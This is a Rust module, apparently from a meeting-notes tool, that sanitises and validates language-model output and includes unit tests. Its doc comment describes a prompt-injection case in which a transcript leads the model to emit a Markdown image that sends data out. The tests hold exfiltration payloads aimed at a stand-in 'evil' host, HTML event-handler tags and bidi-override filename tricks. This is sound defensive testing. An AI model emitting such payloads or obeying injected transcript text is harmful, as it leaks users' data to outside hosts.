// SPDX-License-Identifier: Apache-2.0
//! Checks on model output, shared by notes, enhance and ask.
//!
//! - [`extract_json`]: the JSON object in a reply (tolerates code fences, a
//!   stray `<think>` block, text around the object).
//! - [`plain_text`]: model output is plain text (RT-6): Markdown images and
//!   links, HTML tags and invisible/bidi control characters are removed, so a
//!   transcript that says "output ![x](https://evil/?d=...)" can't make the
//!   notes load or link anything.
//! - [`Cites`]: citation ids must name segments that were in the prompt;
//!   anything else is dropped, and an AI item left without a citation is
//!   dropped too (every AI sentence carries at least one valid anchor).
//! - [`supported`]: a soft check that a claim shares words with what it
//!   cites (counted, not enforced: paraphrase and translation are normal).

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::Regex;
use serde::Serialize;
use serde_json::Value;

use crate::schema::MAX_CITES;
use crate::transcript::Segment;

/// What validation changed or noticed; reported with the result.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Diagnostics {
    /// Model calls made (including retries).
    pub requests: u32,
    /// Retries after invalid output.
    pub retries: u32,
    pub tokens_in: u64,
    pub tokens_out: u64,
    /// AI items removed because none of their citations was valid.
    pub dropped_items: u32,
    /// Citations removed (unknown segment id or duplicates).
    pub dropped_cites: u32,
    /// Items whose text shares no word with the segments they cite.
    pub weak_anchors: u32,
    /// Action items whose owner wasn't a speaker of the cited segments.
    pub unassigned_owners: u32,
    /// Items cut because a list was longer than allowed.
    pub truncated_lists: u32,
    /// Repeated items removed (same text after folding, in the same list).
    pub duplicates: u32,
    /// Citations moved to a neighbouring segment that matches clearly better.
    pub snapped_cites: u32,
}

impl Diagnostics {
    pub fn add(&mut self, o: &Diagnostics) {
        self.requests += o.requests;
        self.retries += o.retries;
        self.tokens_in += o.tokens_in;
        self.tokens_out += o.tokens_out;
        self.dropped_items += o.dropped_items;
        self.dropped_cites += o.dropped_cites;
        self.weak_anchors += o.weak_anchors;
        self.unassigned_owners += o.unassigned_owners;
        self.truncated_lists += o.truncated_lists;
        self.duplicates += o.duplicates;
        self.snapped_cites += o.snapped_cites;
    }
}

/// The JSON object in a model reply.
pub fn extract_json(text: &str) -> Result<Value, String> {
    let text = strip_think(text);
    let start = text.find('{').ok_or("no JSON object in the reply")?;
    let end = text.rfind('}').ok_or("the JSON object is not closed")?;
    if end < start {
        return Err("no JSON object in the reply".into());
    }
    serde_json::from_str(&text[start..=end]).map_err(|e| format!("invalid JSON: {e}"))
}

fn strip_think(text: &str) -> &str {
    match (text.find("<think>"), text.find("</think>")) {
        (Some(a), Some(b)) if a < b => &text[b + "</think>".len()..],
        _ => text,
    }
}

/// `](target)` / `]: target` after any bracket text, nested or not: what
/// makes Markdown a link or an image. The target is removed, whatever the
/// brackets hold.
static MD_TARGET: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\]\s*(?:\([^)]*\)?|:\s*\S+)").expect("valid regex"));
/// Link and image brackets left after the targets are gone.
static MD_BRACKETS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"!?\[|\]").expect("valid regex"));
static HTML_TAG: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"</?[A-Za-z!][^<>]*>").expect("valid regex"));
/// Redaction placeholders (`<<EMAIL_1>>`) look like tags; they are kept,
/// including the one-bracket form a model may write (`<EMAIL_1>`), which
/// would otherwise be removed as a tag before the value can be restored.
static PLACEHOLDER: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"<{1,2}([A-Z]+_[0-9]+)>{1,2}").expect("valid regex"));
static PROTECTED: LazyLock<Regex> =
    LazyLock::new(|| Regex::new("\u{E000}([A-Z]+_[0-9]+)\u{E001}").expect("valid regex"));
static BULLET: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^\s*(?:[-*•]+|#+|\d+[.)])\s+").expect("valid regex"));

/// Zero-width, bidi-override and other invisible formatting characters.
fn invisible(c: char) -> bool {
    matches!(c,
        '\u{00AD}' | '\u{061C}' | '\u{180E}' | '\u{200B}'..='\u{200F}' |
        '\u{202A}'..='\u{202E}' | '\u{2060}'..='\u{2064}' | '\u{2066}'..='\u{2069}' |
        '\u{FEFF}' | '\u{FFF9}'..='\u{FFFB}' | '\u{E0000}'..='\u{E007F}')
}

/// Model (or user) text reduced to one line of plain text.
pub fn plain_text(text: &str) -> String {
    let cleaned: String = text
        .chars()
        .filter(|c| !invisible(*c) && !('\u{E000}'..='\u{E001}').contains(c))
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let s = PLACEHOLDER.replace_all(&cleaned, "\u{E000}${1}\u{E001}");
    let s = MD_TARGET.replace_all(&s, "");
    let s = MD_BRACKETS.replace_all(&s, "");
    let s = HTML_TAG.replace_all(&s, "");
    let s = BULLET.replace(&s, "");
    let s = PROTECTED.replace_all(&s, "<<$1>>");
    s.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Filters citations against the ids a request was allowed to cite.
pub struct Cites<'a> {
    allowed: &'a dyn Fn(u64) -> bool,
}

impl<'a> Cites<'a> {
    pub fn new(allowed: &'a dyn Fn(u64) -> bool) -> Cites<'a> {
        Cites { allowed }
    }

    pub fn allows(&self, id: u64) -> bool {
        (self.allowed)(id)
    }

    /// Valid, distinct ids in order (at most [`MAX_CITES`]).
    pub fn keep(&self, raw: &[i64], diag: &mut Diagnostics) -> Vec<u64> {
        let mut out: Vec<u64> = Vec::new();
        for &id in raw {
            match u64::try_from(id) {
                Ok(id) if (self.allowed)(id) && !out.contains(&id) && out.len() < MAX_CITES => {
                    out.push(id)
                }
                _ => diag.dropped_cites += 1,
            }
        }
        out
    }
}

/// Content words: folded tokens of 3+ chars, or any token with a digit.
pub(crate) fn content_words(text: &str) -> HashSet<String> {
    ghi_text::tokens(&ghi_text::fold(text))
        .into_iter()
        .map(|(_, t)| t)
        .filter(|t| t.chars().count() >= 3 || t.chars().any(|c| c.is_ascii_digit()))
        .collect()
}

/// Small models often cite the line next to the one they used. When a
/// segment within two places of a citation (`near` lists the candidates)
/// shares at least two more content words with `text`, and at least three in
/// all, the citation moves there. Same-language text only.
pub fn snap<'s>(
    text: &str,
    cites: &mut Vec<u64>,
    near: impl Fn(u64) -> Vec<&'s Segment>,
    get: impl Fn(u64) -> Option<&'s Segment>,
    d: &mut Diagnostics,
) {
    let words = content_words(text);
    let score = |s: &Segment| content_words(&s.text).intersection(&words).count();
    for c in cites.iter_mut() {
        let own = get(*c).map_or(0, score);
        if let Some(best) = near(*c)
            .into_iter()
            .max_by_key(|s| (score(s), std::cmp::Reverse(s.id)))
            && score(best) >= own + 2
            && score(best) >= 3
        {
            *c = best.id;
            d.snapped_cites += 1;
        }
    }
    let mut seen = HashSet::new();
    cites.retain(|c| seen.insert(*c));
}

/// True when `text` shares a content word with the cited segments.
pub fn supported(text: &str, cited: &[&Segment]) -> bool {
    let words = content_words(text);
    cited
        .iter()
        .any(|s| !content_words(&s.text).is_disjoint(&words))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::transcript::tests::seg;

    #[test]
    fn finds_the_object_around_noise() {
        let v = extract_json("<think>\nhmm {\n</think>\n```json\n{\"a\": [1]}\n```").unwrap();
        assert_eq!(v["a"][0], 1);
        assert!(extract_json("no json here").is_err());
        assert!(extract_json("{\"a\": ").is_err());
    }

    #[test]
    fn output_is_plain_text() {
        let evil = "Sent ![x](https://evil/?d=secret) the [doc](https://evil/a) <img src=x onerror=y> \
                    <a href=\"https://evil\">here</a>\u{202E}gnp.exe\u{200B}";
        let clean = plain_text(evil);
        for bad in [
            "![",
            "](",
            "<img",
            "<a ",
            "https://evil",
            "\u{202E}",
            "\u{200B}",
        ] {
            assert!(!clean.contains(bad), "{bad} in {clean}");
        }
        assert_eq!(clean, "Sent x the doc heregnp.exe");
        // Nested brackets and reference-style targets don't get through either.
        for evil in [
            "![a[b]c](https://evil/?d=1)",
            "[x[y]z](https://evil)",
            "see [doc][1]\n[1]: https://evil",
            "tag\u{E0041}\u{E0042}s",
        ] {
            let c = plain_text(evil);
            for bad in ["](", "![", "https://evil", "\u{E0041}"] {
                assert!(!c.contains(bad), "`{bad}` in {c:?} from {evil:?}");
            }
        }
        assert_eq!(plain_text("- **Chốt** scope\n  nhé"), "**Chốt** scope nhé");
        // Placeholders and plain URLs stay (shown as text, never as links).
        assert_eq!(plain_text("mail <EMAIL_1> now"), "mail <<EMAIL_1>> now");
        assert_eq!(
            plain_text("mail <<EMAIL_1>> or see https://example.com"),
            "mail <<EMAIL_1>> or see https://example.com"
        );
    }

    #[test]
    fn keeps_only_allowed_distinct_cites() {
        let allowed = |id: u64| id < 10;
        let c = Cites::new(&allowed);
        let mut d = Diagnostics::default();
        assert_eq!(c.keep(&[3, 3, -1, 42, 4], &mut d), vec![3, 4]);
        assert_eq!(d.dropped_cites, 3);
    }

    #[test]
    fn off_by_one_citations_snap_to_the_matching_neighbour() {
        let a = seg(
            0,
            0.0,
            1.0,
            "S1",
            "Chào mọi người, hôm nay họp về kế hoạch beta",
            "vi",
        );
        let b = seg(
            1,
            1.0,
            2.0,
            "S2",
            "Bản build đã xong, còn đồng bộ lịch",
            "vi",
        );
        let segs = [a, b];
        let get = |id: u64| segs.iter().find(|s| s.id == id);
        let near = |_: u64| segs.iter().collect::<Vec<_>>();
        let mut d = Diagnostics::default();
        let mut cites = vec![1];
        snap(
            "Hôm nay họp về kế hoạch beta",
            &mut cites,
            near,
            get,
            &mut d,
        );
        assert_eq!((cites, d.snapped_cites), (vec![0], 1));
        // A citation that already matches stays.
        let mut cites = vec![1];
        snap(
            "Build xong, còn đồng bộ lịch",
            &mut cites,
            near,
            get,
            &mut d,
        );
        assert_eq!(cites, vec![1]);
    }

    #[test]
    fn support_is_word_overlap_after_folding() {
        let s = seg(0, 0.0, 1.0, "S1", "Mình chốt scope cho bản beta nhé", "vi");
        assert!(supported("Chot scope beta", &[&s]));
        assert!(!supported("Budget approved", &[&s]));
    }
}
